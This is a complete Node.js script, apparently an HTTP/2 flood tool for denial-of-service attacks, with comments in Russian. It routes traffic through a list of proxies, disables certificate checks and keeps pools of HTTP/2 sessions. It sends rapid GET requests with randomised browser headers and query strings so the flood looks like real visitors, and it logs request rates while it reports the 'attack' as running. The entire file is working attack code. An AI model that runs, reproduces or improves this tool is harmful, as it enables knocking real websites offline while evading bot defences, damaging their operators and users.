const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const { Worker, isMainThread, parentPort, workerData } = require("worker_threads");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node tlshttp2improved.js target time rate thread proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length - 1)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(randomIntn(0, characters.length - 1));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.baidu.com/",
    ""
];

// Кэшированные заголовки (обновляются редко)
let cachedHeaders = null;
let cacheUpdateCounter = 0;

function buildHeaders() {
    const rand_query = "?" + randomString(5) + "=" + randomIntn(1000, 9999); // Короткий для скорости
    const rand_path = (parsedTarget.path || "/") + rand_query;

    if (!cachedHeaders || cacheUpdateCounter++ % 100 === 0) { // Кэш на 99% запросов
        cachedHeaders = {
            ":method": "GET",
            ":scheme": "https",
            ":authority": parsedTarget.host,
            "user-agent": randomElement(useragents),
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": randomElement(languages),
            "accept-encoding": "gzip, deflate, br, zstd",
            "sec-fetch-site": randomElement(fetch_site),
            "sec-fetch-dest": randomElement(fetch_dest),
            "sec-fetch-mode": randomElement(fetch_mode),
            "upgrade-insecure-requests": "1",
            "te": "trailers"
        };

        const ref = randomElement(referers);
        if (ref) cachedHeaders["referer"] = ref;

        if (Math.random() > 0.5) {
            cachedHeaders["dnt"] = "1";
        }

        if (Math.random() > 0.7) {
            cachedHeaders["sec-ch-ua"] = `"Chromium";v="${randomIntn(130, 131)}", "Not_A Brand";v="8"`;
            cachedHeaders["sec-ch-ua-mobile"] = "?0";
            cachedHeaders["sec-ch-ua-platform"] = randomElement(['"Windows"', '"macOS"', '"Linux"']);
        }
    }

    cachedHeaders[":path"] = rand_path; // Только путь меняется каждый раз
    return cachedHeaders;
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Header = new NetSocket();

// Глобальные для worker: пул сессий, счётчик RPS
let sessionPool = [];
const POOL_SIZE = 5; // Пул из 5 сессий на worker
let rpsCounter = 0;
let lastLogTime = Date.now();

// Функция создания сессии (для пула)
function createSession(proxyAddr) {
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 1
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 100, // Сбалансировано для пула
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.on("connect", () => {
            sessionPool.push(client);
            if (sessionPool.length > POOL_SIZE) sessionPool.shift(); // Лимит пула
        });

        // Cleanup: удаляем из пула на close/error/end
        const cleanup = () => {
            sessionPool = sessionPool.filter(c => c !== client);
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        };

        client.on("close", cleanup);
        client.on("error", cleanup);
        tlsConn.on("error", cleanup);
        tlsConn.on("end", cleanup);
    });
}

// Асинхронная функция для флуда по пулу
async function floodPool() {
    if (sessionPool.length === 0) {
        createSession(randomElement(proxies)); // Создаём, если пул пуст
        return;
    }

    // Распределяем rate по активным сессиям
    const activeSessions = sessionPool.filter(s => s.socket && !s.destroyed);
    if (activeSessions.length === 0) return;

    const requestsPerSession = Math.floor(args.rate / activeSessions.length);
    const promises = [];

    for (const client of activeSessions) {
        for (let i = 0; i < requestsPerSession; i++) {
            promises.push(
                new Promise((resolve) => {
                    const headers = buildHeaders();
                    const request = client.request(headers);
                    request.setTimeout(50); // Быстрый таймаут для cleanup

                    request.on("response", () => {
                        rpsCounter++;
                        request.close();
                        request.destroy();
                        resolve();
                    });

                    request.on("error", () => {
                        request.destroy();
                        resolve(); // Не фейлим, продолжаем
                    });

                    request.end();
                })
            );
        }
    }

    await Promise.all(promises.slice(0, args.rate)); // Лимит на общий rate
}

// Основной цикл воркера
function runWorker() {
    setInterval(async () => {
        await floodPool();
    }, 100); // Интервал 100 мс для снижения overhead

    // Мониторинг RPS каждые 10 сек
    setInterval(() => {
        const now = Date.now();
        if (now - lastLogTime >= 10000) {
            console.log(`[Worker ${process.pid}] RPS: ${rpsCounter / ((now - lastLogTime) / 1000)}`);
            rpsCounter = 0;
            lastLogTime = now;
        }
    }, 1000);
}

// Worker_threads логика
if (isMainThread) {
    console.log(`Starting ${args.threads} workers for ${args.time}s attack...`);
    for (let i = 0; i < args.threads; i++) {
        new Worker(__filename, { workerData: { id: i } });
    }

    const KillScript = () => {
        console.log("Attack stopped.");
        process.exit(1);
    };
    setTimeout(KillScript, args.time * 1000);
} else {
    runWorker();
}<